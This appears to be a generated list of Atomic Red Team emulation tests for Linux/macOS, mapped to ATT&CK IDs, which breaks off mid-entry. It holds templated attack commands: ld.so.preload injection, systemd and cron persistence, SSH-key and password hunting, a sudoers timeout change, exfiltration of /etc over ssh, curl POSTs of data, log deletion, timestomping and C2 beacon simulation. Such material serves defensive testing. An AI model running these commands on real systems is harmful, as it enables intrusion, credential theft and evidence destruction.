Test list contains:
Test list contains:T1065 ,T1055 ,T1501 ,T1064 ,T1145 ,T1057 ,T0002 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1065:Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1055:This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1501:This test creates a Systemd service unit file and enables it as a service.
echo "[Unit]" > #{systemd_service_path}/#{systemd_service_file}
echo "Description=Atomic Red Team Systemd Service" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Service]" >> #{systemd_service_path}/#{systemd_service_file}
echo "Type=simple"
echo "ExecStart=#{execstart_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPre=#{execstartpre_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPost=#{execstartpost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecReload=#{execreload_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStop=#{execstop_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStopPost=#{execstoppost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Install]" >> #{systemd_service_path}/#{systemd_service_file}
echo "WantedBy=default.target" >> #{systemd_service_path}/#{systemd_service_file}
systemctl daemon-reload
systemctl enable #{systemd_service_file}
systemctl start #{systemd_service_file}


T1064:Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1145:Discover private SSH keys on a macOS or Linux system.
sudo find / -name id_rsa >> #{output_file}
sudo find / -name id_dsa >> #{output_file}


T1057:Utilize ps to identify processes.

Upon successful execution, sh will execute ps and output to /tmp/loot.txt. 
ps >> #{output_file}
ps aux >> #{output_file}


T0002:Uses shred to permanently remove a file and the file would be unrecoverable
shred -u #{file_to_remove}


T1105:Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074:Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048:Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099:Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


Test list contains:T0003 ,T1169 ,T1501 ,T1153 ,T1040 ,T1082 ,T0002 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T0003:posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1169:Common Sudo enumeration methods.
cat /etc/sudoers


T1501:This test creates a Systemd service unit file and enables it as a service.
echo "[Unit]" > #{systemd_service_path}/#{systemd_service_file}
echo "Description=Atomic Red Team Systemd Service" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Service]" >> #{systemd_service_path}/#{systemd_service_file}
echo "Type=simple"
echo "ExecStart=#{execstart_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPre=#{execstartpre_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPost=#{execstartpost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecReload=#{execreload_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStop=#{execstop_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStopPost=#{execstoppost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Install]" >> #{systemd_service_path}/#{systemd_service_file}
echo "WantedBy=default.target" >> #{systemd_service_path}/#{systemd_service_file}
systemctl daemon-reload
systemctl enable #{systemd_service_file}
systemctl start #{systemd_service_file}


T1153:Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1040:Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1082:Identify System Info
uname -a >> ~/output/info.txt
cat /etc/lsb-release >> ~/output/info.txt
cat /etc/redhat-release >> ~/output/info.txt
uptime >> ~/output/info.txt
cat /etc/issue >> ~/output/info.txt


T0002:Uses shred to permanently remove a file and the file would be unrecoverable
shred -u #{file_to_remove}


T1105:Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074:Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030:Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099:Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000:Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1169 ,T1158 ,T1154 ,T1040 ,T1083 ,T1070 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

Test list contains:T1132 ,T1206 ,T1158 ,T1064 ,T1081 ,T1201 ,T1036 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1132: Utilizing a common technique for posting base64 encoded data.
echo -n 111-11-1111 | base64
curl -d #{base64_data} -XPOST #{destination_url} >> ~/output/post.bat


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1158: Creates a hidden file inside a hidden directory
mkdir /var/tmp/.hidden-directory
echo "T1158" > /var/tmp/.hidden-directory/.hidden-file


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1201: Lists the password complexity policy to console on CentOS/RHEL 7.x Linux.
cat /etc/security/pwquality.conf >> ~/output/pwd_policy.txt


T1036: Copies sh process, renames it as crond, and executes it to masquerade as the cron daemon.

Upon successful execution, sh is renamed to `crond` and executed.
cp /bin/sh /tmp/crond
/tmp/crond


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1169 ,T1136 ,T1154 ,T1139 ,T1033 ,T0002 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1136: Create a user via useradd
useradd -M -N -r -s /bin/bash -c evil_account #{username}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1139: Search through bash history for specifice commands we want to capture
cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}


T1033: Identify System owner or users on an endpoint

Upon successful execution, sh will stdout list of usernames.
users >> ~/output/users.txt
w >> ~/output/users.txt
who >> ~/output/users.txt


T0002: Uses shred to permanently remove a file and the file would be unrecoverable
shred -u #{file_to_remove}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1132 ,T1169 ,T1158 ,T1154 ,T1145 ,T1083 ,T0002 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1132: Utilizing a common technique for posting base64 encoded data.
echo -n 111-11-1111 | base64
curl -d #{base64_data} -XPOST #{destination_url} >> ~/output/post.bat


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1158: Creates a hidden file inside a hidden directory
mkdir /var/tmp/.hidden-directory
echo "T1158" > /var/tmp/.hidden-directory/.hidden-file


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1145: Discover private SSH keys on a macOS or Linux system.
sudo find / -name id_rsa >> #{output_file}
sudo find / -name id_dsa >> #{output_file}


T1083: Find or discover files on the file system
cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' >> ~/output/nix.txt
cat /etc/mtab >> ~/output/nix.txt
#find . -type f -iname *.pdf > ~/output/nix.txt
find . -type f -name ".*"


T0002: Uses shred to permanently remove a file and the file would be unrecoverable
shred -u #{file_to_remove}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1206 ,T1215 ,T1064 ,T1081 ,T1217 ,T1036 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1215: This test uses the insmod command to load a kernel module for Linux.
insmod #{kernel_module_file}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1217: Searches for Mozilla Firefox's places.sqlite file (on Linux distributions) that contains bookmarks and lists any found instances to a text file.
find / -path "*.mozilla/firefox/*/places.sqlite" -exec echo {} >> ~/output/firefox-bookmarks.txt \;


T1036: Copies sh process, renames it as crond, and executes it to masquerade as the cron daemon.

Upon successful execution, sh is renamed to `crond` and executed.
cp /bin/sh /tmp/crond
/tmp/crond


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1132 ,T1169 ,T1501 ,T1154 ,T1081 ,T1217 ,T1027 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1132: Utilizing a common technique for posting base64 encoded data.
echo -n 111-11-1111 | base64
curl -d #{base64_data} -XPOST #{destination_url} >> ~/output/post.bat


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1501: This test creates a Systemd service unit file and enables it as a service.
echo "[Unit]" > #{systemd_service_path}/#{systemd_service_file}
echo "Description=Atomic Red Team Systemd Service" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Service]" >> #{systemd_service_path}/#{systemd_service_file}
echo "Type=simple"
echo "ExecStart=#{execstart_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPre=#{execstartpre_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPost=#{execstartpost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecReload=#{execreload_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStop=#{execstop_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStopPost=#{execstoppost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Install]" >> #{systemd_service_path}/#{systemd_service_file}
echo "WantedBy=default.target" >> #{systemd_service_path}/#{systemd_service_file}
systemctl daemon-reload
systemctl enable #{systemd_service_file}
systemctl start #{systemd_service_file}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1217: Searches for Mozilla Firefox's places.sqlite file (on Linux distributions) that contains bookmarks and lists any found instances to a text file.
find / -path "*.mozilla/firefox/*/places.sqlite" -exec echo {} >> ~/output/firefox-bookmarks.txt \;


T1027: Creates a base64-encoded data file and decodes it into an executable shell script

Upon successful execution, sh will execute art.sh, which is a base64 encoded command, that stdouts `echo Hello from the Atomic Red Team`.
sh -c "echo ZWNobyBIZWxsbyBmcm9tIHRoZSBBdG9taWMgUmVkIFRlYW0= > ~/output/encoded.dat"
cat ~/output/encoded.dat | base64 -d > ~/output/art.sh


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1055 ,T1501 ,T1153 ,T1139 ,T1135 ,T1070 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1501: This test creates a Systemd service unit file and enables it as a service.
echo "[Unit]" > #{systemd_service_path}/#{systemd_service_file}
echo "Description=Atomic Red Team Systemd Service" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Service]" >> #{systemd_service_path}/#{systemd_service_file}
echo "Type=simple"
echo "ExecStart=#{execstart_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPre=#{execstartpre_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPost=#{execstartpost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecReload=#{execreload_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStop=#{execstop_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStopPost=#{execstoppost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Install]" >> #{systemd_service_path}/#{systemd_service_file}
echo "WantedBy=default.target" >> #{systemd_service_path}/#{systemd_service_file}
systemctl daemon-reload
systemctl enable #{systemd_service_file}
systemctl start #{systemd_service_file}


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1139: Search through bash history for specifice commands we want to capture
cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}


T1135: Network Share Discovery
df -aH >> ~/output/mount.txt
mount >> ~/output/mount.txt


T1070: Delete system and audit logs
rm -rf /private/var/log/system.log*
rm -rf /private/var/audit/*


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1071 ,T1169 ,T1501 ,T1064 ,T1081 ,T1217 ,T0002 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1071: This test simulates an infected host beaconing to command and control.
Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
curl -s -A "HttpBrowser/1.0" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "*<|>*" -m3 #{domain} >> ~/output/malicious.log


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1501: This test creates a Systemd service unit file and enables it as a service.
echo "[Unit]" > #{systemd_service_path}/#{systemd_service_file}
echo "Description=Atomic Red Team Systemd Service" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Service]" >> #{systemd_service_path}/#{systemd_service_file}
echo "Type=simple"
echo "ExecStart=#{execstart_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPre=#{execstartpre_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPost=#{execstartpost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecReload=#{execreload_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStop=#{execstop_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStopPost=#{execstoppost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Install]" >> #{systemd_service_path}/#{systemd_service_file}
echo "WantedBy=default.target" >> #{systemd_service_path}/#{systemd_service_file}
systemctl daemon-reload
systemctl enable #{systemd_service_file}
systemctl start #{systemd_service_file}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1217: Searches for Mozilla Firefox's places.sqlite file (on Linux distributions) that contains bookmarks and lists any found instances to a text file.
find / -path "*.mozilla/firefox/*/places.sqlite" -exec echo {} >> ~/output/firefox-bookmarks.txt \;


T0002: Uses shred to permanently remove a file and the file would be unrecoverable
shred -u #{file_to_remove}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1206 ,T1168 ,T1064 ,T1139 ,T1033 ,T1036 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1168: This test adds a script to a cron folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.
sudo echo "#{command}" > /etc/cron.daily/#{cron_script_name}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1139: Search through bash history for specifice commands we want to capture
cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}


T1033: Identify System owner or users on an endpoint

Upon successful execution, sh will stdout list of usernames.
users >> ~/output/users.txt
w >> ~/output/users.txt
who >> ~/output/users.txt


T1036: Copies sh process, renames it as crond, and executes it to masquerade as the cron daemon.

Upon successful execution, sh is renamed to `crond` and executed.
cp /bin/sh /tmp/crond
/tmp/crond


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1206 ,T1168 ,T1154 ,T1139 ,T1201 ,T1027 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1168: This test adds a script to a cron folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.
sudo echo "#{command}" > /etc/cron.daily/#{cron_script_name}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1139: Search through bash history for specifice commands we want to capture
cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}


T1201: Lists the password complexity policy to console on CentOS/RHEL 7.x Linux.
cat /etc/security/pwquality.conf >> ~/output/pwd_policy.txt


T1027: Creates a base64-encoded data file and decodes it into an executable shell script

Upon successful execution, sh will execute art.sh, which is a base64 encoded command, that stdouts `echo Hello from the Atomic Red Team`.
sh -c "echo ZWNobyBIZWxsbyBmcm9tIHRoZSBBdG9taWMgUmVkIFRlYW0= > ~/output/encoded.dat"
cat ~/output/encoded.dat | base64 -d > ~/output/art.sh


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1169 ,T1158 ,T1064 ,T1040 ,T1057 ,T1009 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1158: Creates a hidden file inside a hidden directory
mkdir /var/tmp/.hidden-directory
echo "T1158" > /var/tmp/.hidden-directory/.hidden-file


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1057: Utilize ps to identify processes.

Upon successful execution, sh will execute ps and output to /tmp/loot.txt. 
ps >> #{output_file}
ps aux >> #{output_file}


T1009: Uses dd to add a zero to the binary to change the hash.

Upon successful execution, dd will modify `/tmp/evil-binary`, therefore the expected hash will change.
dd if=/dev/zero bs=1 count=1 >> #{file_to_pad}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1071 ,T1169 ,T1158 ,T1064 ,T1145 ,T1033 ,T0002 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1071: This test simulates an infected host beaconing to command and control.
Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
curl -s -A "HttpBrowser/1.0" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "*<|>*" -m3 #{domain} >> ~/output/malicious.log


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1158: Creates a hidden file inside a hidden directory
mkdir /var/tmp/.hidden-directory
echo "T1158" > /var/tmp/.hidden-directory/.hidden-file


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1145: Discover private SSH keys on a macOS or Linux system.
sudo find / -name id_rsa >> #{output_file}
sudo find / -name id_dsa >> #{output_file}


T1033: Identify System owner or users on an endpoint

Upon successful execution, sh will stdout list of usernames.
users >> ~/output/users.txt
w >> ~/output/users.txt
who >> ~/output/users.txt


T0002: Uses shred to permanently remove a file and the file would be unrecoverable
shred -u #{file_to_remove}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
